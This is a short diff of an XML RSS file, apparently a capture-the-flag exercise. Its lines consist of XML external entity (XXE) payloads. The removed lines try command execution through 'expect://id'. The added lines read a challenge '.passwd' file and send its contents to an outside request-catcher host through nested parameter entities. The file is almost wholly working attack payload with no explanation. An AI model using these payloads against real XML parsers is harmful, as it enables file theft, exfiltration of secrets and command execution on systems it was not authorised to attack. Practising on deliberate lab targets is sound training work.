@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE foo [ <!ELEMENT foo ANY >
-<!ENTITY payload SYSTEM "expect://id" >]>
+<!ENTITY % file SYSTEM "file:///challenge/web-serveur/ch29/.passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://poilu.free.beeceptor.com?x=%file;'>">
+%eval;
+%exfiltrate;
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page </title>
